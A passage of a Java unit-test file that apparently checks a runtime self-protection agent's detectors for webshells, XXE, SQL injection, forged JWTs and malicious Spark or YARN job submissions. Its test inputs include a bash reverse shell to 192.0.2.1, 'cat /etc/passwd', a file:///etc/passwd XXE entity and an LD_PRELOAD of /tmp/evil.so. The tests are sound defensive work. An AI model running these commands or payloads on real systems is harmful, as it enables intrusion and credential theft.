    var result = ResponseContentDetector.detectXssEcho("<script src='/assets/report.js'></script>", request(Map.of("q", List.of("weekly"))));
    assertTrue(result.isEmpty());
  }

  @Test
  void detectsWebshellEval() {
    var result =
        CodeExecutionDetector.detectWebshellEval("assert", "system('id')", request(Map.of("code", List.of("system('id')"))));

    assertAlgorithm(result, "webshell_eval");
  }

  @Test
  void detectsWebshellCommand() {
    var result =
        ProcessDetector.detectWebshellCommand(
            List.of("sh", "-c", "id"), request(Map.of("cmd", List.of("sh -c id"))));

    assertAlgorithm(result, "webshell_command");
  }

  @Test
  void detectsWebshellFilePutContents() {
    var result =
        HostFileMutationDetector.detectWebshellFileWrite(
            "shell.jsp", "<% out.println(1); %>", request(Map.of("file", List.of("shell.jsp"))));

    assertAlgorithm(result, "webshell_file_put_contents");
  }

  @Test
  void detectsWebshellCallable() {
    var result = CodeExecutionDetector.detectWebshellCallable("system", request());

    assertAlgorithm(result, "webshell_callable");
  }

  @Test
  void detectsWebshellLdPreload() {
    var result = ProcessDetector.detectWebshellLdPreload("LD_PRELOAD", "/tmp/evil.so", request());

    assertAlgorithm(result, "webshell_ld_preload");
  }

  @Test
  void detectsXxeProtocol() {
    var result = NetworkDestinationDetector.detectXxeEntity("xxe", "file:///etc/passwd", request());

    assertTrue(result.isPresent());
    assertEquals("xxe_protocol", result.orElseThrow().algorithm());
  }

  @Test
  void distinguishesRequestSuppliedCatalogReferenceFromFixedCatalogQuery() {
    var body = new RequestContext("POST", "/search", "", Map.of(), Map.of("content-type", "application/json"),
        "{\"source\":\"information_schema.tables\"}");
    assertAlgorithm(JdbcDetector.detectSql("select table_name from information_schema.tables", body), "sql_userinput");
    assertTrue(JdbcDetector.detectSql("select 'information_schema.tables' as term", body).isEmpty());
  }

  @Test
  void recognizesRequestSuppliedSqlCommentOutsideQuotedData() {
    var context = request(Map.of("item", List.of("42 --")));
    assertAlgorithm(JdbcDetector.detectSql("select id from orders where id = 42 -- and active", context),
        "sql_userinput");
    assertTrue(JdbcDetector.detectSql("select id from orders where reference = '42 --'", context).isEmpty());
  }

  @Test
  void detectsJwtVerificationFailureOnDataEaseApiToken() {
    var context =
        new RequestContext(
            "GET",
            "/de2api/user/info",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "x-de-token", forgedJwt()));

    var result =
        CredentialDetector.detectJwtVerificationFailure(
            "auth0-java-jwt",
            "com.auth0.jwt.exceptions.SignatureVerificationException",
            "The Token's Signature resulted invalid when verified using the Algorithm: HmacSHA256",
            context);

    assertAlgorithm(result, "request_jwt_verification_failure");
    assertEquals("x-de-token", result.orElseThrow().details().get("tokenSource"));
    assertEquals("[redacted]", result.orElseThrow().request().headers().get("x-de-token"));
  }

  @Test
  void ignoresJwtVerificationFailureWithoutJwtHeader() {
    var result =
        CredentialDetector.detectJwtVerificationFailure(
            "auth0-java-jwt",
            "com.auth0.jwt.exceptions.SignatureVerificationException",
            "invalid signature",
            requestUri("/de2api/user/info"));

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresJwtVerificationFailureOutsideControlPath() {
    var context =
        new RequestContext(
            "GET",
            "/assets/app.js",
            "",
            Map.of(),
            Map.of("user-agent", "JUnit", "authorization", "Bearer " + forgedJwt()));

    var result =
        CredentialDetector.detectJwtVerificationFailure(
            "auth0-java-jwt",
            "com.auth0.jwt.exceptions.SignatureVerificationException",
            "invalid signature",
            context);

    assertTrue(result.isEmpty());
  }

  @Test
  void detectsSparkRemoteJobSubmission() {
    var descriptor =
        """
        {
          "action": "CreateSubmissionRequest",
          "appResource": "https://example.com/jobs/Exploit.jar",
          "mainClass": "Exploit",
          "sparkProperties": {
            "spark.jars": "https://example.com/jobs/Exploit.jar"
          }
        }
        """;
    var context = new RequestContext("POST", "/v1/submissions/create", "", Map.of(), Map.of());

    assertTrue(RemoteJobDetector.detect("Spark REST", descriptor, context, false).isEmpty());
    var result = RemoteJobDetector.detect("Spark REST", descriptor, context, true);

    assertAlgorithm(result, "request_remote_job_submission");
    assertEquals("https", result.orElseThrow().details().get("artifactScheme"));
    assertEquals("jar", result.orElseThrow().details().get("artifactType"));
    assertTrue(result.orElseThrow().requiresExplicitRule());
  }

  @Test
  void yarnCommandDescriptorRequiresExplicitSelection() {
    var descriptor =
        """
        {
          "application-id": "application_1",
          "am-container-spec": {
            "commands": {
              "command": "/bin/bash -i >& /dev/tcp/192.0.2.1/9999 0>&1"
            }
          },
          "application-type": "YARN"
        }
        """;
    var context = new RequestContext("POST", "/ws/v1/cluster/apps", "", Map.of(), Map.of());

    assertTrue(RemoteJobDetector.detect("YARN", descriptor, context, false).isEmpty());
    var result = RemoteJobDetector.detect("YARN", descriptor, context, true);
    assertTrue(result.orElseThrow().requiresExplicitRule());

    assertAlgorithm(result, "request_remote_job_submission");
    assertEquals("44", result.orElseThrow().details().get("commandLength"));
  }

  @Test
  void artifactMetadataDoesNotMaskAnIndependentSchedulerCommandFinding() {
    String descriptor = "{\"appResource\":\"https://reports.invalid/weekly.jar\",\"mainClass\":\"Weekly\","
        + "\"command\":\"cat /etc/passwd\"}";
    var finding = RemoteJobDetector.detect("job", descriptor, requestUri("/jobs/run"), true).orElseThrow();
    assertTrue(finding.details().containsKey("commandLength"));
    assertFalse(finding.requiresExplicitRule());
  }

  @Test
  void ignoresRemoteArtifactOutsideJobSubmissionContext() {
    var descriptor =
        """
        {"appResource":"https://example.com/library.jar","mainClass":"Example"}
        """;

    var result =
        RemoteJobDetector.detect("HTTP JSON", descriptor, requestUri("/repository/upload"), false);

    assertTrue(result.isEmpty());
  }

  @Test
  void ignoresLocalJobSubmissionArtifact() {
    var descriptor =
        """
        {"appResource":"local:///opt/jobs/example.jar","mainClass":"Example"}
        """;

    var result =
        RemoteJobDetector.detect("Spark REST", descriptor, requestUri("/v1/submissions/create"), false);

    assertTrue(result.isEmpty());
  }

  private static String forgedJwt() {
    return "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
        + "eyJ1aWQiOjEsIm9pZCI6MSwiZXhwIjoyMDAwMDAwMDAwfQ."
        + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  }

  private static List<String> rmiRegistryStack() {
    return List.of(
        "sun.rmi.registry.RegistryImpl",
        "sun.rmi.server.UnicastServerRef",
        "sun.rmi.transport.Transport",
        "sun.rmi.transport.tcp.TCPTransport");
  }

  private static List<String> tomcatTribesStack() {
    return List.of(
        "org.apache.catalina.tribes.group.interceptors.EncryptInterceptor",
        "org.apache.catalina.tribes.io.XByteBuffer",
        "org.apache.catalina.tribes.transport.nio.NioReplicationTask");
  }

  private static List<String> log4jSocketServerStack() {
    return List.of(
        "org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge",
        "org.apache.logging.log4j.core.net.server.TcpSocketServer",
        "org.apache.logging.log4j.core.net.server.AbstractSocketServer");
  }

  private static List<String> casWebflowStateStack() {
    return List.of(
        "org.jasig.cas.util.EncryptedTranscoder",
        "org.springframework.webflow.execution.repository.support.ClientFlowExecutionRepository",
        "org.springframework.webflow.execution.repository.snapshot.SerializedFlowExecutionSnapshot",
        "java.io.ObjectInputStream");
  }

  private static List<String> rmiTransportStack() {
    return List.of(
        "sun.rmi.server.UnicastServerRef",
        "sun.rmi.transport.Transport",
        "sun.rmi.transport.tcp.TCPTransport",
        "org.apache.jmeter.engine.RemoteJMeterEngineImpl");
  }

  private static List<String> neo4jShellRmiStack() {
    return List.of(
        "org.neo4j.shell.impl.ShellServerImpl",
        "org.neo4j.shell.ShellServer",
        "sun.rmi.server.UnicastServerRef",
        "sun.rmi.transport.Transport",
        "sun.rmi.transport.tcp.TCPTransport",
        "java.io.ObjectInputStream");
  }

  private static List<String> weblogicT3Stack() {
    return List.of(
        "weblogic.rjvm.InboundMsgAbbrev",
        "weblogic.rjvm.MsgAbbrevInputStream",
        "weblogic.protocol.ServerChannelInputStream",
        "weblogic.socket.SocketMuxer");
  }

  private static List<String> weblogicIiopStack() {
    return List.of(
        "weblogic.iiop.IIOPInputStream",
        "weblogic.iiop.ServerIIOPConnection",
        "weblogic.rmi.internal.BasicServerRef");
  }

  private static List<String> activeMqJmsObjectMessageStack() {
    return List.of(
        "org.apache.activemq.command.ActiveMQObjectMessage",
        "org.apache.activemq.util.ClassLoadingAwareObjectInputStream",
        "java.io.ObjectInputStream",
        "org.apache.activemq.web.MessageServletSupport");
  }

  private static List<String> jenkinsCliSignedObjectStack() {
    return List.of(
        "hudson.cli.CLICommand",
        "hudson.cli.CliManagerImpl",
        "hudson.remoting.ObjectInputStreamEx",
        "java.io.ObjectInputStream");
  }

  private static List<String> xmlDecoderStack() {
    return List.of(
        "io.ohmyrasp.agent.hook.OhMyRaspHooks",
        "java.beans.Expression",
        "com.sun.beans.decoder.ObjectElementHandler",
        "java.beans.XMLDecoder");
  }
}
